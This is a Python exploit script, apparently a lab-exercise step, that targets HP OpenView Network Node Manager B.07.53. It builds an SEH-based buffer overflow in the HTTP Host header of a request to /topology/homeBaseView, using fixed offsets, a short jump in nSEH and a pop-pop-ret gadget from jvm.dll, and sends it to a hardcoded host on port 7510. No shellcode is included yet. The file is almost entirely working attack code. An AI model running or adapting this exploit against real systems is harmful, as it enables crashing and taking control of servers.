#!/usr/bin/python 

# file name: hpnnm-B.07.53-exploit-v6.py
# author: greyshell
# description: jump over SEH and meet D buffer block

import socket
import os
import sys 

# max crash buff length = 3780
# nSEH offset = 3305, SEH offset = 3309
total_len = 3780

buff_initial = "A" * 3305

# 1035FE34   48               DEC EAX
# 1035FE35   48               DEC EAX
# 1035FE36   77 04            JA SHORT 1035FE59
# little edian format: "\x4c\x4c\x77\x04"  ==> bad char friendly
nseh = "\x48\x48\x77\x04"

# 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP OpenView\jre\jreActive\bin\client\jvm.dll)
seh = "\x4a\x39\x6e\x6d"

buff_last = "D" * (total_len - len(buff_initial) - len(nseh) -len(seh)) 

crash = buff_initial + nseh + seh + buff_last
buffer = "GET /topology/homeBaseView HTTP/1.1\r\n"
buffer += "Host: " + crash + "\r\n"
buffer += "Content-Type: application/x-www-form-urlencoded\r\n" 
buffer += "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer += "Content-Length: 1048580\r\n\r\n" 
print "[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: ", len(crash)
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("172.16.232.178", 7510))
expl.send(buffer)
expl.close()

